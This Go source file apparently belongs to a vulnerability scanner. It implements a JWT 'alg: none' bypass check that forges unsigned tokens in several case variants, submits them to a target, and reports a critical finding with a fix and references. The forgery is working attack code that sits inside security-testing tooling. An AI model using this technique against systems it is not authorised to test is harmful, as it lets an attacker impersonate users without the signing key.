package jwtengine

import (
	"DORM/models"
	"encoding/base64"
	"encoding/json"
	"fmt"
)

// RunAlgNoneAttack (Attack 2): tries the classic 'none'-algorithm bypass in
// several case variants. Decodes its own local copy of the header so it
// never mutates state shared with other attacks.
func RunAlgNoneAttack(target models.ScanTarget, origHeaderB64, origPayloadB64 string, testToken func(tok, endpoint string) bool) *models.Vulnerability {
	headerBytes, err := base64.RawURLEncoding.DecodeString(origHeaderB64)
	if err != nil {
		return nil
	}
	var headerMap map[string]interface{}
	if json.Unmarshal(headerBytes, &headerMap) != nil || headerMap == nil {
		return nil
	}

	for _, alg := range []string{"none", "None", "NONE", "nOnE", "NoNe"} {
		headerMap["alg"] = alg
		newHeaderJSON, _ := json.Marshal(headerMap)
		newHeaderB64 := base64.RawURLEncoding.EncodeToString(newHeaderJSON)
		noneToken := fmt.Sprintf("%s.%s.", newHeaderB64, origPayloadB64)

		if testToken(noneToken, "/") {
			return &models.Vulnerability{
				Target:   target,
				Name:     fmt.Sprintf("JWT 'None' Algorithm Bypass (alg: %s)", alg),
				Severity: "CRITICAL",
				CVSS:     9.1,
				Description: fmt.Sprintf(
					"Server accepted an unsigned JWT (alg: %s).\n"+
						"Any user can forge tokens without knowing the secret key.",
					alg,
				),
				Solution:  "Explicitly reject the 'none' algorithm in JWT validation library config.",
				Reference: "RFC 7519 §6 / CVE-2015-9235",
			}
		}
	}
	return nil
}
